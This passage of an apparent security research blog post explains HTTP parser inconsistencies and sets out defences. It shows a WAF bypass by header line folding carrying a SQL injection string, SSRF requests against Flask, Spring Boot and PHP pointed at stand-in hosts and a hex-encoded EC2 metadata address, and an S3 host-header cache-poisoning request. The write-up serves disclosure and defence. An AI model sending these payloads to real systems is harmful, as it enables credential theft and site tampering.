Nginx were not specifically tested. However, it is highly likely that the findings and vulnerabilities identified in the research are reproducible in the latest version of Nginx as well.\u003c/p\u003e\\n\u003ch2 id=\\\"heading-how-to-prevent\\\"\u003eHow to prevent\u003c/h2\u003e\\n\u003cp\u003eTo prevent these issues, you must use the \u003ccode\u003e~\u003c/code\u003e expression Instead of the \u003ccode\u003e=\u003c/code\u003e expression on Nginx ACL rules, for example:\u003c/p\u003e\\n\u003cpre\u003e\u003ccode class=\\\"lang-plaintext\\\"\u003elocation ~* ^/admin {\\n    deny all;\\n}\\n\u003c/code\u003e\u003c/pre\u003e\\n\u003cp\u003eThe \u003ccode\u003e~\u003c/code\u003e expression matches the string \u003ccode\u003e/admin\u003c/code\u003e in any part of the pathname, in other words, if a user sent a request to \u003ccode\u003e/admin1337\u003c/code\u003e, the request will also be blocked.\u003c/p\u003e\\n\u003ch1 id=\\\"heading-bypassing-aws-waf-acl\\\"\u003eBypassing AWS WAF ACL\u003c/h1\u003e\\n\u003ch2 id=\\\"heading-how-aws-waf-acls-work\\\"\u003eHow AWS WAF ACLs Work\u003c/h2\u003e\\n\u003cp\u003eAWS ACL (Access Control List) rules are a component of load balancers, providing control over incoming and outgoing network traffic. These rules define access permissions based on specified conditions, allowing or denying requests to and from the load balancer.\u003c/p\u003e\\n\u003cp\u003eYou can configure the AWS Web Application Firewall (WAF) ACL to examine and validate HTTP headers. AWS WAF ACL rules allow you to define conditions based on specific header attributes or values, enabling you to control and filter incoming requests.\u003c/p\u003e\\n\u003cp\u003eHeader ACL example:\u003c/p\u003e\\n\u003cp\u003e\u003cimg src=\\\"https://cdn.hashnode.com/res/hashnode/image/upload/v1686762641000/8f9c4e41-c17a-48d6-b2f5-72d76217e337.png\\\" alt class=\\\"image--center mx-auto\\\" /\u003e\u003c/p\u003e\\n\u003cp\u003eIn the above example, if a request contains a SQL Injection payload in the \u003ccode\u003eX-Query\u003c/code\u003e header, AWS WAF recognizes the SQL Injection attempt and responds with a \u003ccode\u003e403 Forbidden\u003c/code\u003e HTTP status code. This prevents the request from being forwarded to the backend, effectively blocking any potential exploitation of the application's database through SQL Injection attacks.\u003c/p\u003e\\n\u003cp\u003e\u003cimg src=\\\"https://cdn.hashnode.com/res/hashnode/image/upload/v1686763561032/d592bd74-2618-461d-9768-314549b691cf.png\\\" alt class=\\\"image--center mx-auto\\\" /\u003e\u003c/p\u003e\\n\u003cp\u003eAs you can see, the above request carried the payload \u003ccode\u003e' or '1'='1' --\u003c/code\u003e at the \u003ccode\u003eX-Query\u003c/code\u003e header, and then was blocked by the AWS WAF.\u003c/p\u003e\\n\u003ch2 id=\\\"heading-bypassing-aws-waf-acl-with-line-folding\\\"\u003eBypassing AWS WAF ACL With Line Folding\u003c/h2\u003e\\n\u003cp\u003eWeb servers like Node.js, Flask and many others sometimes encounter a phenomenon known as \\\"line folding.\\\" Line folding refers to the practice of splitting long header values using the characters \\\\x09 (tab) and \\\\x20 (space) into multiple lines for readability. However, this behavior can lead to compatibility issues and potential security vulnerabilities.\u003c/p\u003e\\n\u003cp\u003eFor example, the header \u003ccode\u003e1337: Value\\\\r\\\\n\\\\t1337\u003c/code\u003e in the following request will be interpreted as \u003ccode\u003e1337: Value\\\\t1337\u003c/code\u003e in the Node.js server:\u003c/p\u003e\\n\u003cpre\u003e\u003ccode class=\\\"lang-http\\\"\u003e\u003cspan class=\\\"hljs-keyword\\\"\u003eGET\u003c/span\u003e \u003cspan class=\\\"hljs-string\\\"\u003e/\u003c/span\u003e HTTP/1.1\\n\u003cspan class=\\\"hljs-attribute\\\"\u003eHost\u003c/span\u003e: target.com\\n\u003cspan class=\\\"hljs-attribute\\\"\u003e1337\u003c/span\u003e: Value\\n    1337\\n\u003cspan class=\\\"hljs-attribute\\\"\u003eConnection\u003c/span\u003e: close\\n\u003c/code\u003e\u003c/pre\u003e\\n\u003cp\u003eKnowing it, I discovered that it's possible to bypass the AWS WAF by using line folding behavior.\u003c/p\u003e\\n\u003cp\u003eUsing the same AWS WAF that protects the \u003ccode\u003eX-Query\u003c/code\u003e from SQL Injection payloads, the following HTTP request was used to confirm that the Node.js server received the payload \u003ccode\u003e' or '1'='1' --\u003c/code\u003e in the \u003ccode\u003eX-Query\u003c/code\u003e header.\u003c/p\u003e\\n\u003cp\u003eBelow is a graphical example of how the applications interpret the HTTP request header with line folding:\u003c/p\u003e\\n\u003cp\u003e\u003cimg src=\\\"https://cdn.hashnode.com/res/hashnode/image/upload/v1686765599948/440f51b0-18bb-451c-92da-3428000cd7f0.png\\\" alt class=\\\"image--center mx-auto\\\" /\u003e\u003c/p\u003e\\n\u003cp\u003eFor the exploitation scenario, let's take the following Node.js source code as a reference. It will return the requested headers as a Json:\u003c/p\u003e\\n\u003cpre\u003e\u003ccode class=\\\"lang-javascript\\\"\u003eapp.get(\u003cspan class=\\\"hljs-string\\\"\u003e'/*'\u003c/span\u003e, \u003cspan class=\\\"hljs-function\\\"\u003e(\u003cspan class=\\\"hljs-params\\\"\u003ereq, res\u003c/span\u003e) =\u0026gt;\u003c/span\u003e {\\n    res.send(req.headers);\\n});\\n\u003c/code\u003e\u003c/pre\u003e\\n\u003cp\u003eBelow is an example of an exploitation request:\u003c/p\u003e\\n\u003cpre\u003e\u003ccode class=\\\"lang-http\\\"\u003e\u003cspan class=\\\"hljs-attribute\\\"\u003eGET / HTTP/1.1\\\\r\\\\n\\nHost\u003c/span\u003e: target.com\\\\r\\\\n\\n\u003cspan class=\\\"hljs-attribute\\\"\u003eX-Query\u003c/span\u003e: Value\\\\r\\\\n\\n\\\\t' or '1'='1' -- \\\\r\\\\n\\n\u003cspan class=\\\"hljs-attribute\\\"\u003eConnection\u003c/span\u003e: close\\\\r\\\\n\\n\\\\r\\\\n\\n\u003c/code\u003e\u003c/pre\u003e\\n\u003cp\u003e\u003cimg src=\\\"https://cdn.hashnode.com/res/hashnode/image/upload/v1686765362775/dbd69c56-503e-45bb-ada6-358d3d987ede.png\\\" alt class=\\\"image--center mx-auto\\\" /\u003e\u003c/p\u003e\\n\u003cp\u003eIn the provided screenshot, it is evident that the Node.js application interpreted the characters \u003ccode\u003e' or '1'='1' --\u003c/code\u003e as the value for the \u003ccode\u003eX-Query\u003c/code\u003e header. However, the AWS WAF treated it as a header name instead.\u003c/p\u003e\\n\u003cp\u003eThis bypass technique was reported to the AWS security team and fixed in 2022.\u003c/p\u003e\\n\u003ch1 id=\\\"heading-incorrect-path-parsing-leads-to-server-side-request-forgery\\\"\u003eIncorrect Path Parsing Leads to Server-Side Request Forgery\u003c/h1\u003e\\n\u003cp\u003eIn the previous sections, I provided reasons to be cautious about trusting reverse proxies. However, in this section, I will demonstrate why utilizing a reverse proxy can be advantageous...\u003c/p\u003e\\n\u003cp\u003eIn this section, I will leverage an incorrect pathname interpretation to exploit a Server-Side Request Forgery vulnerability in popular servers and frameworks such as Spring Boot, Flask, and PHP.\u003c/p\u003e\\n\u003cp\u003eNormally, a valid HTTP pathname starts with \u003ccode\u003e/\u003c/code\u003e or \u003ccode\u003ehttp(s)://domain/\u003c/code\u003e, but the majority of the popular WEB servers do not verify it correctly, which can lead to a security risk.\u003c/p\u003e\\n\u003ch2 id=\\\"heading-ssrf-on-flask-through-incorrect-pathname-interpretation\\\"\u003eSSRF on Flask Through Incorrect Pathname Interpretation\u003c/h2\u003e\\n\u003cp\u003eFlask is a lightweight web framework for Python, and it offers a straightforward and flexible approach to web development.\u003c/p\u003e\\n\u003cp\u003eAfter conducting tests on Flask's pathname parsing, I discovered that it accepts certain characters that it shouldn't. As an example, the following HTTP request, which should be considered invalid, is surprisingly treated as valid by the framework, but the server responds \u003ccode\u003e404 Not Found\u003c/code\u003e:\u003c/p\u003e\\n\u003cpre\u003e\u003ccode class=\\\"lang-http\\\"\u003e\u003cspan class=\\\"hljs-keyword\\\"\u003eGET\u003c/span\u003e \u003cspan class=\\\"hljs-string\\\"\u003e@/\u003c/span\u003e HTTP/1.1\\n\u003cspan class=\\\"hljs-attribute\\\"\u003eHost\u003c/span\u003e: target.com\\n\u003cspan class=\\\"hljs-attribute\\\"\u003eConnection\u003c/span\u003e: close\\n\u003c/code\u003e\u003c/pre\u003e\\n\u003cp\u003eWhile investigating how this behavior can potentially result in a security vulnerability, I came across a helpful \u003ca target=\\\"_blank\\\" href=\\\"https://medium.com/@zwork101/making-a-flask-proxy-server-online-in-10-lines-of-code-44b8721bca6\\\"\u003eMedium blog post\u003c/a\u003e that demonstrates the creation of a proxy using the Flask framework. Below is an example of the code provided in the blog post:\u003c/p\u003e\\n\u003cpre\u003e\u003ccode class=\\\"lang-python\\\"\u003e\u003cspan class=\\\"hljs-keyword\\\"\u003efrom\u003c/span\u003e flask \u003cspan class=\\\"hljs-keyword\\\"\u003eimport\u003c/span\u003e Flask\\n\u003cspan class=\\\"hljs-keyword\\\"\u003efrom\u003c/span\u003e requests \u003cspan class=\\\"hljs-keyword\\\"\u003eimport\u003c/span\u003e get\\n\\napp = Flask(\u003cspan class=\\\"hljs-string\\\"\u003e'__main__'\u003c/span\u003e)\\nSITE_NAME = \u003cspan class=\\\"hljs-string\\\"\u003e'https://google.com/'\u003c/span\u003e\\n\\n\u003cspan class=\\\"hljs-meta\\\"\u003e@app.route('/', defaults={'path': ''})\u003c/span\u003e\\n\u003cspan class=\\\"hljs-meta\\\"\u003e@app.route('/\u0026lt;path:path\u0026gt;')\u003c/span\u003e\\n\u003cspan class=\\\"hljs-function\\\"\u003e\u003cspan class=\\\"hljs-keyword\\\"\u003edef\u003c/span\u003e \u003cspan class=\\\"hljs-title\\\"\u003eproxy\u003c/span\u003e(\u003cspan class=\\\"hljs-params\\\"\u003epath\u003c/span\u003e):\u003c/span\u003e\\n  \u003cspan class=\\\"hljs-keyword\\\"\u003ereturn\u003c/span\u003e get(\u003cspan class=\\\"hljs-string\\\"\u003ef'\u003cspan class=\\\"hljs-subst\\\"\u003e{SITE_NAME}\u003c/span\u003e\u003cspan class=\\\"hljs-subst\\\"\u003e{path}\u003c/span\u003e'\u003c/span\u003e).content\\n\\napp.run(host=\u003cspan class=\\\"hljs-string\\\"\u003e'0.0.0.0'\u003c/span\u003e, port=\u003cspan class=\\\"hljs-number\\\"\u003e8080\u003c/span\u003e)\\n\u003c/code\u003e\u003c/pre\u003e\\n\u003cp\u003eMy first thought was: \\\"\u003cem\u003eWhat if the developer forgets to add the last slash in the\u003c/em\u003e \u003ccode\u003eSITE_NAME\u003c/code\u003e \u003cem\u003evariable?\u003c/em\u003e\\\". And yes, it can lead to an SSRF.\u003c/p\u003e\\n\u003cp\u003eSince Flask also allows any ASCII character after the \u003ccode\u003e@\u003c/code\u003e, it's possible to fetch an arbitrary domain after concatenating the malicious pathname and the destination server.\u003c/p\u003e\\n\u003cp\u003ePlease consider the following source code as a reference for the exploitation scenario:\u003c/p\u003e\\n\u003cpre\u003e\u003ccode class=\\\"lang-python\\\"\u003e\u003cspan class=\\\"hljs-keyword\\\"\u003efrom\u003c/span\u003e flask \u003cspan class=\\\"hljs-keyword\\\"\u003eimport\u003c/span\u003e Flask\\n\u003cspan class=\\\"hljs-keyword\\\"\u003efrom\u003c/span\u003e requests \u003cspan class=\\\"hljs-keyword\\\"\u003eimport\u003c/span\u003e get\\n\\napp = Flask(\u003cspan class=\\\"hljs-string\\\"\u003e'__main__'\u003c/span\u003e)\\nSITE_NAME = \u003cspan class=\\\"hljs-string\\\"\u003e'https://google.com'\u003c/span\u003e\\n\\n\u003cspan class=\\\"hljs-meta\\\"\u003e@app.route('/', defaults={'path': ''})\u003c/span\u003e\\n\u003cspan class=\\\"hljs-meta\\\"\u003e@app.route('/\u0026lt;path:path\u0026gt;')\u003c/span\u003e\\n\\n\u003cspan class=\\\"hljs-function\\\"\u003e\u003cspan class=\\\"hljs-keyword\\\"\u003edef\u003c/span\u003e \u003cspan class=\\\"hljs-title\\\"\u003eproxy\u003c/span\u003e(\u003cspan class=\\\"hljs-params\\\"\u003epath\u003c/span\u003e):\u003c/span\u003e\\n  \u003cspan class=\\\"hljs-keyword\\\"\u003ereturn\u003c/span\u003e get(\u003cspan class=\\\"hljs-string\\\"\u003ef'\u003cspan class=\\\"hljs-subst\\\"\u003e{SITE_NAME}\u003c/span\u003e\u003cspan class=\\\"hljs-subst\\\"\u003e{path}\u003c/span\u003e'\u003c/span\u003e).content\\n\\n\u003cspan class=\\\"hljs-keyword\\\"\u003eif\u003c/span\u003e __name__ == \u003cspan class=\\\"hljs-string\\\"\u003e\\\"__main__\\\"\u003c/span\u003e:\\n    app.run(threaded=\u003cspan class=\\\"hljs-literal\\\"\u003eFalse\u003c/span\u003e)\\n\u003c/code\u003e\u003c/pre\u003e\\n\u003cp\u003ePresented below is an example of an exploitation request:\u003c/p\u003e\\n\u003cpre\u003e\u003ccode class=\\\"lang-http\\\"\u003e\u003cspan class=\\\"hljs-keyword\\\"\u003eGET\u003c/span\u003e \u003cspan class=\\\"hljs-string\\\"\u003e@evildomain.com/\u003c/span\u003e HTTP/1.1\\n\u003cspan class=\\\"hljs-attribute\\\"\u003eHost\u003c/span\u003e: target.com\\n\u003cspan class=\\\"hljs-attribute\\\"\u003eConnection\u003c/span\u003e: close\\n\u003c/code\u003e\u003c/pre\u003e\\n\u003cp\u003eIn the following example, I was able to fetch my EC2 metadata:\u003c/p\u003e\\n\u003cp\u003e\u003cimg src=\\\"https://cdn.hashnode.com/res/hashnode/image/upload/v1686771183056/fe166abf-b2cb-41be-846b-11ac56b33d71.png\\\" alt class=\\\"image--center mx-auto\\\" /\u003e\u003c/p\u003e\\n\u003ch2 id=\\\"heading-ssrf-on-spring-boot-through-incorrect-pathname-interpretation\\\"\u003eSSRF on Spring Boot Through Incorrect Pathname Interpretation\u003c/h2\u003e\\n\u003cp\u003eUpon discovering the presence of an SSRF vulnerability in Flask, I delved into exploring how this behavior could be exploited in other frameworks. As my research progressed, it became apparent that Spring Boot is also susceptible to this particular issue.\u003c/p\u003e\\n\u003cp\u003eAuthentication bypasses, ACL bypasses, and path traversal are known vectors when the application parses Matrix parameters. Servlet matrix parameters are a feature introduced in the Servlet specification that allows you to extract and handle additional data present in the URL path. Unlike query parameters that are separated by the \u003ccode\u003e?\u003c/code\u003e character, matrix parameters are separated by the \u003ccode\u003e;\u003c/code\u003e character within the URL.\u003c/p\u003e\\n\u003cp\u003eDuring the research, I discovered that the Spring framework accepts the matrix parameter separator character \u003ccode\u003e;\u003c/code\u003e before the first slash of the HTTP pathname:\u003c/p\u003e\\n\u003cpre\u003e\u003ccode class=\\\"lang-http\\\"\u003e\u003cspan class=\\\"hljs-keyword\\\"\u003eGET\u003c/span\u003e \u003cspan class=\\\"hljs-string\\\"\u003e;1337/api/v1/me\u003c/span\u003e HTTP/1.1\\n\u003cspan class=\\\"hljs-attribute\\\"\u003eHost\u003c/span\u003e: target.com\\n\u003cspan class=\\\"hljs-attribute\\\"\u003eConnection\u003c/span\u003e: close\\n\u003c/code\u003e\u003c/pre\u003e\\n\u003cp\u003eIf a developer implements a server-side request that utilizes the complete pathname of the request to fetch an endpoint, it can lead to the emergence of Server-Side Request Forgery (SSRF).\u003c/p\u003e\\n\u003cp\u003ePlease consider the following source code as a reference for the exploitation scenario:\u003c/p\u003e\\n\u003cp\u003e\u003cimg src=\\\"https://cdn.hashnode.com/res/hashnode/image/upload/v1686772007869/5661fff8-9e48-4c63-b78b-cb69ee0582c0.png\\\" alt class=\\\"image--center mx-auto\\\" /\u003e\u003c/p\u003e\\n\u003cp\u003eThe code snippet above utilizes the \u003ccode\u003eHttpServletRequest\u003c/code\u003e API to retrieve the requested URL through the \u003ccode\u003egetRequestURI()\u003c/code\u003e function. Subsequently, it concatenates the requested URI with the destination endpoint \u003ca href=\\\"http://ifconfig.me\\\" class=\\\"autolinkedURL autolinkedURL-url\\\" target=\\\"_blank\\\"\u003eifconfig.me\u003c/a\u003e.\u003c/p\u003e\\n\u003cp\u003eConsidering that Spring permits any character following the Matrix parameter separator, becoming possible to use the \u003ccode\u003e@\u003c/code\u003e character to fetch an arbitrary endpoint as well.\u003c/p\u003e\\n\u003cp\u003eBelow is an example of the exploit request:\u003c/p\u003e\\n\u003cpre\u003e\u003ccode class=\\\"lang-http\\\"\u003e\u003cspan class=\\\"hljs-keyword\\\"\u003eGET\u003c/span\u003e \u003cspan class=\\\"hljs-string\\\"\u003e;@evil.com/url\u003c/span\u003e HTTP/1.1\\n\u003cspan class=\\\"hljs-attribute\\\"\u003eHost\u003c/span\u003e: target.com\\n\u003cspan class=\\\"hljs-attribute\\\"\u003eConnection\u003c/span\u003e: close\\n\u003c/code\u003e\u003c/pre\u003e\\n\u003cp\u003e\u003cimg src=\\\"https://cdn.hashnode.com/res/hashnode/image/upload/v1686772361453/e66a9edf-a590-4d82-b75a-180c33ae1a21.png\\\" alt class=\\\"image--center mx-auto\\\" /\u003e\u003c/p\u003e\\n\u003ch2 id=\\\"heading-php-built-in-web-server-case-study-ssrf-through-incorrect-pathname-interpretation\\\"\u003ePHP Built-in Web Server Case Study - SSRF Through Incorrect Pathname Interpretation\u003c/h2\u003e\\n\u003cp\u003eThe PHP Built-in web server suffers from the same vulnerability. Still, the Built-in server is not used in production involvements, so I decided to present this behavior as a case study that is unlikely to happen in real-world applications.\u003c/p\u003e\\n\u003cp\u003eSurprisingly, PHP allows the asterisk \u003ccode\u003e*\u003c/code\u003e character before the first slash in the pathname, and between the asterisk and the first slash, almost all ASCII characters are accepted as valid HTTP request.\u003c/p\u003e\\n\u003cp\u003eHowever, there are two limitations that arise with PHP:\u003c/p\u003e\\n\u003col\u003e\\n\u003cli\u003e\u003cp\u003eThis technique can only be used for the root pathname \u003ccode\u003e/\u003c/code\u003e and cannot be applied to other endpoints, in other words, the vulnerable code must be in the \u003ccode\u003eindex.php\u003c/code\u003e file;\u003c/p\u003e\\n\u003c/li\u003e\\n\u003cli\u003e\u003cp\u003eDots \u003ccode\u003e.\u003c/code\u003e are not allowed before the first slash, which restricts the inclusion of arbitrary IPs and domains, to circumvent it, the payload must include a dotless-hex encoded IP address of the malicious domain.\u003c/p\u003e\\n\u003c/li\u003e\\n\u003c/ol\u003e\\n\u003cp\u003eLet's consider the following PHP code for this exploitation scenario:\u003c/p\u003e\\n\u003cpre\u003e\u003ccode class=\\\"lang-php\\\"\u003e\u003cspan class=\\\"hljs-meta\\\"\u003e\u0026lt;?php\u003c/span\u003e\\n$site = \u003cspan class=\\\"hljs-string\\\"\u003e\\\"http://ifconfig.me\\\"\u003c/span\u003e;\\n$current_uri = $_SERVER[\u003cspan class=\\\"hljs-string\\\"\u003e'REQUEST_URI'\u003c/span\u003e];\\n\\n$proxy_site = $site.$current_uri;\\nvar_dump($proxy_site);\\n\\n\u003cspan class=\\\"hljs-keyword\\\"\u003eecho\u003c/span\u003e \u003cspan class=\\\"hljs-string\\\"\u003e\\\"\\\\n\\\\n\\\"\u003c/span\u003e;\\n\\n$response = file_get_contents($proxy_site);\\nvar_dump($response);\\n\u003cspan class=\\\"hljs-meta\\\"\u003e?\u0026gt;\u003c/span\u003e\\n\u003c/code\u003e\u003c/pre\u003e\\n\u003cp\u003eThe provided code retrieves the HTTP request pathname using \u003ccode\u003e$_SERVER['REQUEST_URI']\u003c/code\u003e and concatenates it with the destination domain.\u003c/p\u003e\\n\u003cp\u003eFor performing IP address dotless-hex encoding, you can utilize the tool \u003ca target=\\\"_blank\\\" href=\\\"https://gist.github.com/mhmdiaa/2587e2330b87db99c81ace2a190e235f\\\"\u003eip-encoder.py\u003c/a\u003e.\u003c/p\u003e\\n\u003cp\u003eThe resulting payload used for exploiting which fetches the EC2 metadata is as follows:\u003c/p\u003e\\n\u003cpre\u003e\u003ccode class=\\\"lang-http\\\"\u003e\u003cspan class=\\\"hljs-keyword\\\"\u003eGET\u003c/span\u003e \u003cspan class=\\\"hljs-string\\\"\u003e*@0xa9fea9fe/\u003c/span\u003e HTTP/1.1\\n\u003cspan class=\\\"hljs-attribute\\\"\u003eHost\u003c/span\u003e: target.com\\n\u003cspan class=\\\"hljs-attribute\\\"\u003eConnection\u003c/span\u003e: close\\n\u003c/code\u003e\u003c/pre\u003e\\n\u003cp\u003eIn the following proof of concept, I successfully retrieved my EC2 metadata:\u003c/p\u003e\\n\u003cp\u003e\u003cimg src=\\\"https://cdn.hashnode.com/res/hashnode/image/upload/v1686789542807/4ca585ed-37e3-4384-bec0-ba2c6e59e75a.png\\\" alt class=\\\"image--center mx-auto\\\" /\u003e\u003c/p\u003e\\n\u003ch2 id=\\\"heading-how-to-prevent-1\\\"\u003eHow to prevent\u003c/h2\u003e\\n\u003cul\u003e\\n\u003cli\u003e\u003cp\u003eIt is essential to consistently employ complete URL domains when concatenating them with user input. For instance, ensure that a trailing slash is added after the domain name, such as \u003ccode\u003ehttp://ifconfig.me/\u003c/code\u003e.\u003c/p\u003e\\n\u003c/li\u003e\\n\u003cli\u003e\u003cp\u003eUtilizing a reverse proxy that effectively handles HTTP requests. The vulnerabilities mentioned are typically only possible if the framework is used without any additional reverse proxy that verifies the HTTP pathname. In other words, incorporating a reverse proxy can significantly enhance the security of the web application.\u003c/p\u003e\\n\u003c/li\u003e\\n\u003c/ul\u003e\\n\u003ch1 id=\\\"heading-http-desync-cache-poisoning-attacks\\\"\u003eHTTP Desync Cache Poisoning Attacks\u003c/h1\u003e\\n\u003cp\u003eInconsistencies exist among servers and reverse proxies when it comes to removing invalid invisible characters from header names before interpreting them. This inconsistency can lead to notable vulnerabilities, such as HTTP Request Smuggling. But in this section, I will discuss a vulnerability and technique that I discovered during my research that combines Desync attacks with Cache Poisoning, which affects cache servers when integrated with AWS S3 buckets.\u003c/p\u003e\\n\u003cp\u003eBut before we continue, we must understand some functionalities of cache servers.\u003c/p\u003e\\n\u003ch2 id=\\\"heading-cache-keys\\\"\u003eCache Keys\u003c/h2\u003e\\n\u003cp\u003eCache keys are unique identifiers used by cache servers to store and retrieve cached data, they serve as references or labels that allow access to cached content.\u003c/p\u003e\\n\u003cp\u003eThe most frequently used cache key is typically derived from the URL's pathname. When a user sends a request to a server that utilizes caching, the cache server employs the requested URL to locate the corresponding cached response to serve back to the user.\u003c/p\u003e\\n\u003cp\u003e\u003cimg src=\\\"https://cdn.hashnode.com/res/hashnode/image/upload/v1686943618847/430c595b-b7ca-4dec-b31c-58374b1d0a30.webp\\\" alt class=\\\"image--center mx-auto\\\" /\u003e\u003c/p\u003e\\n\u003cp\u003eIn addition to the URL's pathname, another default cache key is the Host header. Let's consider a scenario where a cached JavaScript file is located at \u003ccode\u003ehttps://target.com/static/main.js\u003c/code\u003e. When a user sends an HTTP request to this cached URL, the cache server will return the stored response without having to forward the request to the backend server.\u003c/p\u003e\\n\u003cp\u003eHowever, if a user sends an HTTP request to the same endpoint but modifies the Host header to \u003ccode\u003e1337.target.com\u003c/code\u003e, the cache server will attempt to retrieve the backend of the corresponding response for the \u003ccode\u003e/static/main.js\u003c/code\u003e URL using the \u003ccode\u003e1337.target.com\u003c/code\u003e host header. Subsequently, it will generate a stored response specifically for that particular HTTP message.\u003c/p\u003e\\n\u003ch2 id=\\\"heading-s3-http-desync-cache-poisoning-issue\\\"\u003eS3 HTTP Desync Cache Poisoning Issue\u003c/h2\u003e\\n\u003cp\u003eIn this section, I will demonstrate an HTTP Desync vulnerability that can result in Cache Poisoning, impacting principally AWS S3 buckets.\u003c/p\u003e\\n\u003cp\u003eIn the Amazon AWS S3 buckets, the Host header plays a crucial role in routing requests to the correct bucket and enabling proper access to the stored content. When interacting with an S3 bucket, the Host header helps direct requests to the appropriate endpoint within the AWS infrastructure.\u003c/p\u003e\\n\u003cp\u003eWhen a request is made to an S3 bucket, the AWS infrastructure inspects the Host header to determine the target bucket. So if a user sends an HTTP request to the domain \u003ccode\u003eyour.s3.amazonaws.com\u003c/code\u003e but changes the host header to \u003ccode\u003emy.s3.amazonaws.com\u003c/code\u003e, internally, AWS will \\\"ignore\\\" the domain name, fetching the bucket specified in the host header only. This is a common practice on Cloud services.\u003c/p\u003e\\n\u003ch3 id=\\\"heading-the-vulnerability\\\"\u003eThe Vulnerability\u003c/h3\u003e\\n\u003cp\u003eThe interpretation of host headers for S3 buckets involves two key aspects:\u003c/p\u003e\\n\u003col\u003e\\n\u003cli\u003e\u003cp\u003eWhen multiple host headers are included in the request, only the first one will be taken, and any additional headers will be ignored.\u003c/p\u003e\\n\u003c/li\u003e\\n\u003cli\u003e\u003cp\u003eThe following bytes are ignored if present in the header name: \u003ccode\u003e\\\\x1f\u003c/code\u003e, \u003ccode\u003e\\\\x1d\u003c/code\u003e, \u003ccode\u003e\\\\x0c\u003c/code\u003e, \u003ccode\u003e\\\\x1e\u003c/code\u003e, \u003ccode\u003e\\\\x1c\u003c/code\u003e, \u003ccode\u003e\\\\x0b\u003c/code\u003e;\u003c/p\u003e\\n\u003c/li\u003e\\n\u003c/ol\u003e\\n\u003cp\u003eThe vulnerability arises from an inconsistency in the host header interpretation. If the cache server mistakenly includes the ignored bytes as part of the header name, treating it as an invalid host header, while S3 interprets it as a valid host header, it becomes possible to cache arbitrary bucket responses on vulnerable websites.\u003c/p\u003e\\n\u003cp\u003eThis behavior allows caching arbitrary S3 bucket content in vulnerable websites.\u003c/p\u003e\\n\u003cp\u003eConsider the following exploitation request:\u003c/p\u003e\\n\u003cp\u003e\u003cimg src=\\\"https://cdn.hashnode.com/res/hashnode/image/upload/v1686958907855/ffd360e3-5eb8-4ffd-939d-b46614f9f430.png\\\" alt class=\\\"image--center mx-auto\\\" /\u003e\u003c/p\u003e\\n\u003cpre\u003e\u003ccode class=\\\"lang-http\\\"\u003e\u003cspan class=\\\"hljs-keyword\\\"\u003eGET\u003c/span\u003e \u003cspan class=\\\"hljs-string\\\"\u003e/\u003c/span\u003e HTTP/1.1\\n[\\\\x1d]Host: evilbucket.com\\n\u003cspan class=\\\"hljs-attribute\\\"\u003eHost\u003c/span\u003e: example.bucket.com\\n\u003cspan class=\\\"hljs-attribute\\\"\u003eConnection\u003c/span\u003e: close\\n\u003c/code\u003e\u003c/pre\u003e\\n\u003cul\u003e\\n\u003cli\u003e\u003cp\u003eFirst, the cache server examines the header \u003ccode\u003e\\\\x1dHost: evilbucket.com\u003c/code\u003e and treats it like any other unkeyed header;\u003c/p\u003e\\n\u003c/li\u003e\\n\u003cli\u003e\u003cp\u003eSubsequently, the cache server will correctly interpret the \u003ccode\u003eexample.bucket.com\u003c/code\u003e header as a valid host header, resulting in the final cache response being associated with this host value.\u003c/p\u003e\\n\u003c/li\u003e\\n\u003cli\u003e\u003cp\u003eUpon reaching the S3 bucket, the header \u003ccode\u003e\\\\x1dHost: evilbucket.com\u003c/code\u003e will be mistakenly interpreted as a valid host header, while the intended \u003ccode\u003eHost: example.bucket.com\u003c/code\u003e header will be ignored. This misinterpretation by AWS will lead to the fetching of the malicious header's associated bucket.\u003c/p\u003e\\n\u003c/li\u003e\\n\u003c/ul\u003e\\n\u003cp\u003eThe final result is a complete cache poisoning of the page with arbitrary content.\u003c/p\u003e\\n\u003cp\u003eThe proof of concept video demonstrates the exploitation of this vulnerability in an outdated Varnish cache server. It is important to note that newer versions of Varnish are not susceptible to this vulnerability:\u003c/p\u003e\\n\u003cdiv class=\\\"embed-wrapper\\\"\u003e\u003cdiv class=\\\"embed-loading\\\"\u003e\u003cdiv class=\\\"loadingRow\\\"\u003e\u003c/div\u003e\u003cdiv class=\\\"loadingRow\\\"\u003e\u003c/div\u003e\u003c/div\u003e\u003ca class=\\\"embed-card\\\" href=\\\"https://www.youtube.com/watch?v=dnf6Zi5eNW8\\\"\u003ehttps://www.youtube.com/watch?v=dnf6Zi5eNW8\u003c/a\u003e\u003c/div\u003e\\n\u003cp\u003e \u003c/p\u003e\\n\u003cp\u003eIn addition to Varnish, other cache servers such as Akamai were also vulnerable to this issue. However, it's important to note that this vulnerability has been addressed and cannot be reproduced on any AWS service today.\u003c/p\u003e\\n\u003ch1 id=\\\"heading-conclusion\\\"\u003eConclusion\u003c/h1\u003e\\n\u003cp\u003eIn conclusion, this research delved into the realm of security vulnerabilities in web applications, specifically focusing on HTTP parsers and the implications they can have on overall security. By exploring inconsistencies in HTTP parsers across various technologies, such as load balancers, reverse proxies, web servers, and caching servers, I unveiled potential avenues for exploitation.\u003c/p\u003e\\n\u003cp\u003eI demonstrated how certain behaviors, like path normalization and the acceptance of special characters, can lead to bypassing security rules and even opening the door to Server-Side Request Forgery (SSRF) and Cache Poisoning vulnerabilities.\u003c/p\u003e\\n\u003cp\u003eMoreover, I highlighted the significance of utilizing reverse proxies that effectively validate and sanitize HTTP requests. Implementing a robust reverse proxy can significantly bolster the security posture of a web application by intercepting and filtering malicious requests before they reach the backend servers.\u003c/p\u003e\\n\",\"cuid\":\"clj09rtsw000109le1k4xblen\",\"views\":19538,\"title\":\"Exploiting HTTP Parsers Inconsistencies\",\"slug\":\"exploiting-http-parsers-inconsistencies\",\"dateAdded\":\"2023-06-17T17:25:25.280Z\",\"dateUpdated\":\"2023-10-23T11:36:22.929Z\",\"type\":\"story\",\"coverImage\":\"https://cdn.hashnode.com/res/hashnode/image/upload/v1686855768304/932a6fc8-23cf-429f-88e2-bee9d6c0d010.png\",\"isCoverImagePortrait\":false,\"isCoverAttributionHidden\":false,\"brief\":\"The HTTP protocol plays a vital role in the seamless functioning of web applications, however, the implementation of HTTP parsers across different technologies can introduce subtle discrepancies, leading to potential security loopholes.\\nIn this resea...\",\"isFollowing\":false,\"totalReactions\":43,\"totalReactionsByCurrentUser\":0,\"series\":null,\"isPinnedToBlog\":false,\"readTime\":17,\"sB\":false,\"isAMA\":false,\"subtitle\":\"Unveiling Vulnerabilities in HTTP Parsers: Exploiting Inconsistencies for Security 